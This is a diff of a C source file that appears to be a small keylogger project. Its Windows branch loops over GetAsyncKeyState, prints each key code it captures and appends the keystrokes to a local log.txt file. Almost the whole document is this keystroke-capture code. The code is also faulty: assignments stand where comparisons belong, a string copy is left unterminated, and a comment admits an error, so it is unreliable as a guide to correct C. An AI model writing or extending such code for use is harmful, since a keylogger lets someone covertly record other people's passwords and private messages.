@@ -39,54 +39,74 @@
 #elif defined (_WIN32)
   #include <Windows.h>
   #pragma comment(lib, "User32.lib")
-  // Run main function
 
-int vk_size = 2;
-char vk_string[];
+  // Global variables
+  char vk_string[20];
+  BOOL stand = FALSE;
+  BOOL invalid = FALSE;
 
-  int process_vKey(int vk){
-    printf("Key pressed %c with number %i\n", vk, vk);
-
+  // Key code processing
+  void process_vKey(int vk){
+    stand = FALSE;
+    invalid = FALSE;
     //A-Z only
-    if ( vk > 40 && vk < 90){
-      vk_size = 2;
-      return vk;
+    if ( vk > 40 && vk < 90 || vk == 32){
+      printf("[*] Key pressed %c with keycode %i\n", vk, vk);
+      sprintf(vk_string, "%d", vk);
+      stand = TRUE;
+    }
+    else if (vk == 13){
+      strncpy(vk_string, "[ENTER]", 7);
+      printf("[!] Key pressed %s with keycode %i\n", vk_string, vk);
     }
     else{
-      return 0;
+      printf("[*] Invalid keycode code: %i \n", vk);
+      invalid = TRUE;
     }
   }
 
+  // Main windows function
   int main(){
-    printf("Compiled on windows\n");
+    printf("[*] Compiled on windows\n");
 
     int last_vKey = 0;
   	while (1){
-  		for (int vKey = 30; vKey < 100; ++vKey)
+  		for (int vKey = 3; vKey < 100; ++vKey)
   		{
   			if (GetAsyncKeyState(last_vKey) != 0)
   				continue;
 
   			last_vKey = vKey;
+
         // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate
   			if (GetAsyncKeyState(vKey) != 0)
   			{
   				last_vKey = vKey;
-          vKey = process_vKey(vKey);
+
+          // Open text file with create or append
   				FILE *f = NULL;
   				fopen_s(&f, "log.txt", "a+");
-        /**  int *size = malloc(vk_size);
-          printf("%i\n",*size);
-          free(size);**/
 
-  				char buffer[4];
+          // Run key process function - this should proably be improved.
+          process_vKey(vKey);
 
-          if (vKey != 0){
-            printf("[*] Key processed: %c \n", vKey);
-    				sprintf_s(buffer, sizeof(buffer), "%c", vKey);
-    				fwrite(buffer, 1, 1, f);
+          // Check if it is a valid virtual key code
+          if (invalid = TRUE){
+            // Check if it is a standard keycode (A-z)
+            if (stand = TRUE){
+              int key = atoi(vk_string);
+              sprintf_s(vk_string, sizeof(vk_string), "%c", key);
+              printf("[+] Key processed: %c\n", key);
+            }
+            // Print unique keys like the enter button.
+            else{
+              // ERROR HERE: VK STRING IS WRONG.
+              printf("[+] Key processed: %s\n", vk_string);
+            }
+            // Write to file
+    				fwrite(vk_string, 1, 1, f);
           }
-
+          // Close file
           fclose(f);
   			}
   		}
@@ -95,7 +115,7 @@ char vk_string[];
 #elif
     // If windows or linux is not defined
     int main(){
-      printf("Error while compiling... incompatable os\n");
+      printf("[-] Error while compiling... incompatable os\n");
       exit(0);
     }
 
